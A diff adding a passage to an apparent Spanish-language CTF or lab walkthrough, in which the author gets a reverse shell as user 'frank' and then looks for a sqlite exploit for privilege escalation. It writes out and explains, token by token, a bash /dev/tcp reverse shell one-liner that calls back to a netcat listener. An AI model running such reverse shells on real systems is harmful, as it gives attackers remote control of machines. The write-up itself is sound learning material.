@@ -364,4 +364,24 @@ Vamos a probar con este código:
 
 Le damos a update y actualizamos como antes igual y teniendo el netcap abierto por el puerto 1234
 
+![image](https://github.com/user-attachments/assets/7f07abd2-a4f9-4872-b830-fc5b7fec2c41)
+
+Con esta shell nos pone donde estamos
+```
+/bin/bash -i (AQUI HEMOS CREADO UNA NUEVA SESION DE LA SHELL) 
+>& (ESTO NOS HA REDIRIGIDO) 
+/dev/tcp/10.0.2.15/1234 (NOS REDIRIGE AQUI CON LA INFORMACION QUE LE HEMOS PUESTO (nuestra ip y el puerto))
+0>&1 (ESTO REDIRIGE TODO A LA ENTRADA)
+```
+
+Vemos todo en el usuario frank y lo que podemos hacer:
+
+![image](https://github.com/user-attachments/assets/22fc053f-55fb-487e-bb1c-53ceb44d99d3)
+
+Intentamos hacer un sudo -l sin exito, entonces tendremos que buscar un exploit para sqlite, para ello vamos al navegador
+
+Necesitaremos explotar el bypass, entonces buscamos el exploit
+
+![image](https://github.com/user-attachments/assets/b5e1b0b5-f079-4b60-9a6b-0d84ce1d6c89)
+
 
